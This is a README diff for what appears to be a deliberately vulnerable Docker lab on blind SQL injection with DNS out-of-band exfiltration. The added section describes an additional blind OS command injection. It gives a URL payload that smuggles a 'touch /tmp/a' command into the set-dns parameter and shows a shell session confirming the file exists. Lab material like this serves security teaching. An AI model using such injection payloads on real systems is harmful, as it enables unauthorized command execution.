@@ -134,3 +134,16 @@ You can eventually automate the process using SQLMap. You can find a good resour
 ### Rebuild containers
 	
 	sudo docker-compose build --no-cache
+
+## 💡 Additional vulnerability
+Actually the application is also vulnerable to blind OS command injection. Try for istance the following payload:
+
+	/search?set-dns=172.20.53.53 %26 touch %2Ftmp%2Fa&id=1
+Verify that /tmp/a file is present inside the web container
+	
+ 	[~/blindSQLi-DNS-OOB] sudo docker exec -it blindsqli-dns-oob_web_1 /bin/bash
+	root@f14b578ea18d:/app# ls -al /tmp/a 
+	-rw-r--r-- 1 root root 0 Jul 10 07:04 /tmp/a
+
+ 
+
